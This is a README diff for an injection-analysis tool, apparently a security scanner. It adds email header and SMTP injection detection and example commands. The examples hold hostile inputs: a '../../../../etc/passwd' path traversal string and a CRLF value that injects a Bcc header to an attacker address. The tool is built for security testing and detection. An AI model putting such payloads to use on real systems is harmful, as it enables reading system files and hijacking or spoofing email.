@@ -112,6 +112,15 @@ Path traversal / LFI:
   scheme (RFI), and a PHP / stream wrapper (`php://filter`, `php://input`,
   `expect://`, `data://`, ...), with per-context payload mutation.
 
+Email header / SMTP injection:
+
+- Analyzes an input that reaches an email message, classifying whether it is a
+  header value, the message body, or a raw SMTP command line. Detects a line
+  break that injects a new header (a silent `Bcc` / `Cc` recipient or a spoofed
+  header), overrides the body, smuggles an SMTP command (`RCPT TO`, `MAIL FROM`,
+  `DATA`), or sends a lone `.` line that ends the DATA phase, including encoded
+  CR/LF, with per-context payload mutation.
+
 Code (eval sink) injection:
 
 - Analyzes an input reaching an eval-style sink in Python, JavaScript, or PHP,
@@ -340,6 +349,12 @@ Analyze path traversal / LFI with `--lang path`:
 
 ```bash
 xyainjex -l path '/var/www/uploads/{INPUT}' '../../../../etc/passwd'
+```
+
+Analyze email header / SMTP injection with `--lang mail`:
+
+```bash
+xyainjex -l mail 'To: {INPUT}' $'user@example.com\r\nBcc: attacker@evil.example'
 ```
 
 Analyze code (eval sink) injection with `--lang code` (`-d` python, javascript,
